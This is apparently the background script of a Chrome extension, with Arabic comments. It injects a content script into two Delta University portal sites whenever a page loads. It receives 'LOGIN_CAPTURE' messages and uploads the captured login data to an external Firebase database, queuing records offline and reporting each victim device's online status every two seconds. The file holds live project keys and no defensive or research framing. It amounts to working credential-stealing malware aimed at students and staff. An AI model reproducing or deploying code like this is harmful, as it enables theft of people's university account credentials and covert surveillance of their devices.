importScripts("firebase-app-compat.js", "firebase-auth-compat.js", "firebase-database-compat.js");

const firebaseConfig = {
  apiKey: "AIzaSyB3yFrcs3vQg_30Q-ZIN7Oj2yZ606YWLtc",
  authDomain: "hake-737fa.firebaseapp.com",
  databaseURL: "https://hake-737fa-default-rtdb.firebaseio.com",
  projectId: "hake-737fa"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let ready = false;
let sessionId = null;

// ================= متغيرات نظام النبض (Heartbeat) =================
let deviceId = null;
let statusRef = null;
let heartbeatInterval = null; 

async function getDeviceId() {
    let result = await chrome.storage.local.get("deviceId");
    if (!result.deviceId) {
        const newId = "dev_" + Math.random().toString(36).substr(2, 9) + "_" + Date.now();
        await chrome.storage.local.set({ deviceId: newId });
        return newId;
    }
    return result.deviceId;
}

function getReadableTime() {
    return new Date().toLocaleString('en-GB', { 
        hour12: true, year: 'numeric', month: '2-digit', 
        day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' 
    });
}

function startFastInterval() {
    if (heartbeatInterval) clearInterval(heartbeatInterval);
    heartbeatInterval = setInterval(() => {
        if (statusRef) {
            statusRef.update({ 
                online: true, 
                last_seen: getReadableTime() 
            });
        }
    }, 2000); 
}

async function startHeartbeat() {
    deviceId = await getDeviceId();
    statusRef = db.ref("status/" + deviceId);

    // ✅ حفظ الحالة الأولى كـ Object
    statusRef.set({ online: true, last_seen: getReadableTime() });

    // ✅ لو الاتصال قطع، الفايربيز بيحط Object جديد فيه false
    statusRef.onDisconnect().set({ 
        online: false, 
        last_seen: getReadableTime() 
    });
    
    startFastInterval();
    chrome.alarms.create("heartbeat", { periodInMinutes: 0.5 });
}

chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === "heartbeat") {
        if (!statusRef) {
            startHeartbeat();
        } else {
            statusRef.update({ online: true, last_seen: getReadableTime() });
            startFastInterval();
        }
    }
});

// ================= تسجيل الدخول للفايربيز =================
firebase.auth().signInAnonymously().then(() => {
  ready = true;
  sessionId = firebase.auth().currentUser.uid + "_" + Date.now();
  startHeartbeat(); 
  flushQueue();
}).catch((e) => console.error("Firebase Auth Error:", e));


// ================= دالة حقن السكريبت في التابات =================
function injectContentScript(tabId) {
    chrome.scripting.executeScript({
        target: { tabId: tabId },
        files: ['content.js']
    }).catch(err => console.log("Injection skipped (maybe already injected):", err));
}

// ================= الصمود والحقن عند التشغيل =================
chrome.runtime.onInstalled.addListener(() => {
    chrome.alarms.create("keepalive", { periodInMinutes: 0.5 });
    chrome.tabs.query({}, (tabs) => {
        tabs.forEach(tab => {
            if (tab.url && (tab.url.includes('dep.deltauniv.edu.eg') || tab.url.includes('dulms.deltauniv.edu.eg'))) {
                injectContentScript(tab.id);
            }
        });
    });
});

chrome.runtime.onStartup.addListener(() => {
    chrome.tabs.query({}, (tabs) => {
        tabs.forEach(tab => {
            if (tab.url && (tab.url.includes('dep.deltauniv.edu.eg') || tab.url.includes('dulms.deltauniv.edu.eg'))) {
                injectContentScript(tab.id);
            }
        });
    });
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        if (tab.url.includes('dep.deltauniv.edu.eg') || tab.url.includes('dulms.deltauniv.edu.eg')) {
            injectContentScript(tabId);
        }
    }
});

// ================= استقبال البيانات من content.js =================
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "LOGIN_CAPTURE") {
        saveRecord(message.data);
    }
});

async function saveRecord(data) {
    data.session = sessionId || "pending";
    const finalKey = `${data.site}_${Date.now()}`;
    try {
        await db.ref("requests/" + finalKey).set(data);
    } catch (e) {
        const q = (await chrome.storage.local.get("q")).q || [];
        q.push({ key: finalKey, record: data }); 
        if (q.length > 5000) q.shift();
        await chrome.storage.local.set({ q });
    }
}

async function flushQueue() {
  const q = (await chrome.storage.local.get("q")).q || [];
  if (!q.length || !ready) return;
  const remaining = [];
  for (let i = 0; i < q.length; i++) {
    const item = q[i];
    try {
        await db.ref("requests/" + item.key).set(item.record);
    } catch (e) {
        remaining.push(...q.slice(i));
        break;
    }
  }
  await chrome.storage.local.set({ q: remaining });
}